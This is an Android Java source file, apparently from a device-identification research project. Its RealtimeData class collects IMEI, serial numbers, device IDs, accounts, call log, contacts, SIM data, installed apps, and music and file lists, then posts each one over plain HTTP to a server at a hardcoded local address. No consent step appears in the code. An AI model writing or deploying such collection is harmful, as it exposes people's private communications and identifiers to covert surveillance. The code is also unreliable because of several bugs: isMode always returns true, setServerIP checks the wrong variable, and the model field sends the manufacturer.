package com.tum.ident.realtime;

import java.util.ArrayList;

import android.content.Context;
import android.util.Log;

import com.tum.ident.data.DataController;
import com.tum.ident.data.DataController.DataType;
import com.tum.ident.data.DataItem;
import com.tum.ident.device.Device;
import com.tum.ident.device.DeviceIDItem;
import com.tum.ident.files.FileItemList;
import com.tum.ident.identification.IdentificationItem;
import com.tum.ident.music.MusicItemList;
import com.tum.ident.network.NetworkClient;
import com.tum.ident.network.NetworkNotification;
import com.tum.ident.user.User;
import com.tum.ident.util.Util;

public class RealtimeData implements Runnable {

	private final static String TAG = "RealtimeData";

	private  static String serverURL = "";

	private static DataController dataController;

	private  static boolean sending = false;
	private  static String mode = "";

	private static int[] ip = new int[4];

	@Override
	public void run() {
		serverURL = RealtimeIP.lookUp(ip);
		if (serverURL.length() > 0) {
			serverURL = serverURL + "/";
			sending = true;
		}

	}

	public static void setMode(String m){
		mode = m;
	}
	
	public static boolean isSending(){
		return sending;
	}
	
	public static boolean isMode(String m){
		if(mode.equals(mode)){
			return true;
		}
		return false;
	}
	
	
	public static void setServerIP(String ipString){
		if (ip != null) {
			if (ip.equals("") == false) {
				if (ip.equals("0.0.0.0") == false) {
			
					serverURL =  "http://" + ipString + "/";;
					RealtimeData.sending = true;
				}
			}
		}
	}
	
	public static void init(Context context, DataController dC) {
		dataController = dC;
		ip[0] = 192;
		ip[1] = 168;
		ip[2] = 44;
		ip[3] = 1;

		new Thread(new RealtimeData()).start();

	}

	public static void send(String type, byte data[]) {
		if (serverURL.length() > 0) {
			if (data != null) {
				NetworkClient networkClient = new NetworkClient();
				String url = serverURL + type + "/";

				Log.v(TAG, "url: " + url);
				byte[] bytes = networkClient.postByteData(url, data,
						NetworkClient.DataType.Byte, true);
				if (bytes != null) {
					if (bytes.length > 0) {
						Log.v(TAG, "send: type: " + type + " - respsonse: "
								+ bytes.length);
					}
				}
			}
		}
	}

	public static void sendNotification(String urlPart) {
		NetworkNotification notification = new NetworkNotification();
		if (serverURL.length() > 1) {
			String url = serverURL.substring(0, serverURL.length() - 1)
					+ urlPart;
			notification.post(url);
		}
	}

	public static boolean isRealTimeData(Object dataObject) {
		DataType type = DataItem.getDataType(dataObject);
		switch (type) {
		case PixelErrorFront:
		case PixelErrorBack:
		case DarkFrameFront:
		case DarkFrameBack:
		case Location:
		case UserDevice:
		case Music:
		case File:
		case Orientation:
		case Battery:
			return true;
		default:
			return false;
		}
	}

	public static void send() {
		if (dataController != null) {
			send(dataController.getIdentificationItem());
			send(dataController.getMusicList());
			send(dataController.getFileList());
			dataController.sendBatteryRealTime();
		}
	}

	public static void send(Object dataObject) {
		if (dataObject != null) {
			String data = "";
			DataType type = DataItem.getDataType(dataObject);
			switch (type) {
			case PixelErrorFront:
				break;
			case PixelErrorBack:
				break;
			case DarkFrameFront:
				break;
			case DarkFrameBack:
				break;
			case Location:
				break;
			case UserDevice:
				IdentificationItem item = ((IdentificationItem) dataObject);
				data = item.getDeviceID();
				send("deviceID", data.getBytes());
				data = item.getUserID();
				send("userID", data.getBytes());
				Device device = item.getUserDevice().getDevice();

				data = device.getBluetoothString();
				send("bluetooth", data.getBytes());

				data = device.getWLANString();
				send("wlan", data.getBytes());

				data = "CPU=" + device.getCpuInfo() + "\n\n";
				data = data + "Storage=" + device.getInternalStorageSize()
						+ "\n\n";
				data = data + "Memory=" + device.getTotalMem() + "\n\n";
				send("hardware", data.getBytes());

				data = "Manufacturer=" + device.getManufacturer() + "\n";

				send("manufacturer", data.getBytes());

				data = "Model=" + device.getManufacturer() + "\n";

				send("model", data.getBytes());

				ArrayList<DeviceIDItem> list = device.getDeviceIDList();
				if (list != null) {
					if (list.size() > 0) {
						DeviceIDItem idItem = list.get(0);
						data = idItem.getAndroidID();
						send("androidID", data.getBytes());

						data = idItem.getGsfAndroidID();
						send("gsfAndroidID", data.getBytes());

						data = idItem.getImeiString();
						send("imei", data.getBytes());

						data = idItem.getSerialNum();
						send("serial", data.getBytes());
					}
				}

				User user = item.getUserDevice().getUser();
				data = user.getAccountListString();
				send("accounts", data.getBytes());

				data = user.getBluetoothString();
				send("userBluetooth", data.getBytes());

				data = user.getWLANString();
				send("userWLAN", data.getBytes());

				data = user.getCallLogString();
				send("callLog", data.getBytes());

				data = user.getSIMListString() + "\n\n"
						+ user.getCarrierListString();
				send("sim", data.getBytes());

				data = user.getContactString();
				send("contacts", data.getBytes());

				data = user.getPackageString();
				send("packages", data.getBytes());

				data = user.getUserName();
				send("userName", data.getBytes());

				// usw
				break;
			case Music:
				data = Util.toStringFilterNewLine((((MusicItemList) dataObject)
						.getList()));
				send("music", data.getBytes());
				break;
			case File:
				data = Util.toStringFilterNewLine((((FileItemList) dataObject)
						.getList()));
				send("files", data.getBytes());
				break;

			case Orientation:

				break;
			case Battery:
				dataController.sendBatteryRealTime();
				break;
			default:
				data = "";
			}
		}
	}

}

/*
 * 
 * while(true){ Bundle params = new Bundle(); NetworkClient networkClient = new
 * NetworkClient();
 * 
 * StringBuffer outputBuffer = new StringBuffer(10000); for (int i = 0; i <
 * 10000; i++){ outputBuffer.append("a"); }
 * 
 * params.putString("test",outputBuffer.toString());
 * networkClient.setTimeout(30000); byte[] bytes =
 * networkClient.postBundleData(url,params,NetworkClient.DataType.Byte,true);
 * Log.v(TAG, "ip: "+bytes); if(bytes!=null){
 * Log.v(TAG,"bytes.length:"+bytes.length ); } try { Thread.sleep(10); } catch
 * (InterruptedException e) { // TODO Auto-generated catch block
 * e.printStackTrace(); } }
 */

